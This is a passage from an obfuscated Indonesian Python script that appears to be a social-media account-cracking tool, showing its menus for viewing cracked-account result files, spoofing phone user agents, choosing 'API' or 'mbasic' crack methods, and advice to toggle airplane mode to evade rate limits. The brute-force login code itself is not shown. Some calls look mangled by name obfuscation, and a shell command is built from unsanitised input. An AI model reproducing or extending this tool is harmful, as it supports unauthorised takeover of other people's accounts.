            _dapunta_cici_('\n%s[%s Hasil Crack Yang Tersimpan Di File CP %s]\n'%(_U_,_P_,_U_))
            for file in cpl:
                _dapunta_cici_('%s[%s•%s] %s%s'%(_U_,_P_,_U_,_P_,file))
            _dapunta_cici_('')
            files = _cici_dapunta_('%s[%s•%s] %sMasukkan Nama File : '%(_U_,_P_,_U_,_P_))
            _dapunta_cici_('')
            if files == "":
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(_Dapunta_Sayang_Cici_)
            os.system('cat CP/%s'%(files))
            ppp = _dapunta_dapunta_("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            _dapunta_cici_('\n%s[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(_U_,_P_,_U_,_P_,del1,len(ppp)))
        except:
            _dapunta_cici_('%s[%s Hasil Tidak Ditemukan %s]'%(_M_,_P_,_M_))
    else:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
    _menu_dev_(_Dapunta_Sayang_Cici_)

### Mau Recode Lu Ya?
def _check_recode_(_oscylopsce_,_ascylapsci_,_escylipsce_):
    _recode_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    if _uscylupsci_ not in _recode_:_dapunta_cici_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(_M_,_P_,_M_,_P_))
    else:return _menu_dev_(_recode_)

### Menu User Agent
def _default_ua_(_Cici_Cantik_Banget_):
    ua = ua_xiaomi
    try:
        ugent = _dapunta_dapunta_('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        _login_dev_(_Cici_Cantik_Banget_)
def _ugen_dev_(_Dapunta_Sayang_Cici_):
    _var_ugen_(_Dapunta_Sayang_Cici_)
    pmu = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('')
    if pmu in[""]:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['1','01','001','a']:
        os.system('xdg-_dapunta_dapunta_ https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        _cici_dapunta_('%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['2','02','002','b']:
        _del_()
        ua = _cici_dapunta_("%s[%s•%s] %sMasukkan User Agent : \n\n"%(_U_,_P_,_U_,_P_))
        try:
            ugent = _dapunta_dapunta_('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            _dapunta_cici_("\n%s[ %sBerhasil Mengganti User Agent %s]"%(_U_,_P_,_U_))
            _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
            _menu_dev_(_Dapunta_Sayang_Cici_)
        except (KeyError,IOError):
            _dapunta_cici_("\n%s[ %sGagal Mengganti User Agent %s]"%(_M_,_P_,_M_))
            _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_M_,_P_,_M_,_P_))
            _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['3','03','003','c']:
        _ugen_hp_(_Dapunta_Sayang_Cici_)
    elif pmu in ['4','04','004','d']:
        _del_()
        _dapunta_cici_("%s[ %sUser Agent Berhasil Dihapus %s]"%(_U_,_P_,_U_))
        _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['5','05','005','e']:
        try:
            ungser = _dapunta_dapunta_('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Tidak Ditemukan'
        _dapunta_cici_("%s[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(_U_,_P_,_U_,_P_,_U_,ungser))
        _dapunta_cici_("\n%s[ %sIni Adalah User Agent Anda Saat Ini %s]"%(_U_,_P_,_U_))
        _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['0','00','000','f']:
        _menu_dev_(_Dapunta_Sayang_Cici_)
    else:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
def _ugen_hp_(_Dapunta_Sayang_Cici_):
    _del_()
    _dapunta_cici_('%s[%s1%s] %sXiaomi'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sNokia'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s3%s] %sAsus'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s4%s] %sHuawei'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s5%s] %sVivo'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s6%s] %sOppo'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s7%s] %sSamsung'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s8%s] %sWindows'%(_U_,_P_,_U_,_P_))
    pc = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('')
    if pc in['']:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pc in ['1','01']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    _dapunta_cici_("%s[ %sBerhasil Mengganti User Agent %s]"%(_U_,_P_,_U_))
    _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
    _menu_dev_(_Dapunta_Sayang_Cici_)

### Tampilan User Agent
def _var_ugen_(_Dapunta_Cinta_Cici_):
    _dapunta_cici_("%s[%s1%s] %sDapatkan User Agent"%(_U_,_P_,_U_,_P_))
    _dapunta_cici_("%s[%s2%s] %sGanti User Agent %s[%sManual%s]"%(_U_,_P_,_U_,_P_,_U_,_P_,_U_))
    _dapunta_cici_("%s[%s3%s] %sGanti User Agent %s[%sSesuaikan HP%s]"%(_U_,_P_,_U_,_P_,_U_,_P_,_U_))
    _dapunta_cici_("%s[%s4%s] %sHapus User Agent"%(_U_,_P_,_U_,_P_))
    _dapunta_cici_("%s[%s5%s] %sCek User Agent"%(_U_,_P_,_U_,_P_))
    _dapunta_cici_("%s[%s0%s] %sKembali"%(_U_,_P_,_U_,_P_))

### Tampilan Metode
def start_method():
    _dapunta_cici_('\n%s[%s1%s] %sMetode Api'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sMetode Mbasic'%(_U_,_P_,_U_,_P_))

### Tampilan Mulai Crack
def started():
    _dapunta_cici_('%s[%s•%s] %sCrack Sedang Berjalan...'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _dapunta_cici_('%s[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(_U_,_P_,_U_,_P_,tanggal))
    _dapunta_cici_('%s[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(_U_,_P_,_U_,_P_))

### Start
if __name__=='__main__':
    os.system('git pull')
    _clear_()
    _folder_()
    _check_recode_(_oscylopsce_,_ascylapsci_,_escylipsce_)

# _dapunta_cici_('%s[%s•%s] %s'%(_U_,_P_,_U_,_P_))
# _dapunta_cici_('%s[%s!%s] %s'%(_M_,_P_,_M_,_P_))